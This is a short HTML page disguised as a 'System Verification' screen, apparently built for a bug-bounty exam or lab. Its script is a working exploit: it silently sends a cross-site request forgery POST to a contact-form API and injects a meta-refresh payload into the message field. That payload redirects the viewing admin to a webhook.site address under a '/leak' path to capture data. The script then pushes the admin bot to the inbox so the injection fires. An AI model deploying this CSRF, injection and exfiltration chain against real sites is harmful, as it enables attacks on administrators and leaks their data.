<!DOCTYPE html>
<html>
<head>
    <title>System Verification</title>
</head>
<body>
    <h1>Processing... Please wait.</h1>
    <script>
        const targetApi = "https://api-bugbounty-exam.hashacademy.co/api/contact/submit";
        const webhook = "https://webhook.site/c1a55b0c-1861-47a1-90bc-f341746b4c27";

        const payload = {
            "name": "test",
            "email": "jikuxn9@gmail.com",
            "phone": "",
            "subject": "Urgent: Session Verification",
            "message": "<meta http-equiv='refresh' content='0;url=" + webhook + "/leak?data=check_referer'>",
            "category": "general",
            "priority": "medium"
        };

        async function launch() {
            // Step 1: CSRF the JSON payload
            // We use 'no-cors' to ensure the request goes through even if CORS fails
            await fetch(targetApi, {
                method: 'POST',
                mode: 'no-cors',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            });

            // Step 2: Redirect the Admin to the page where they view messages
            // This is the CRITICAL part. If the bot doesn't go here, the XSS won't fire.
            setTimeout(() => {
                window.location.href = "https://bugbounty-exam.hashacademy.co/admin/inbox";
            }, 1500);
        }

        launch();
    </script>
</body>
</html>
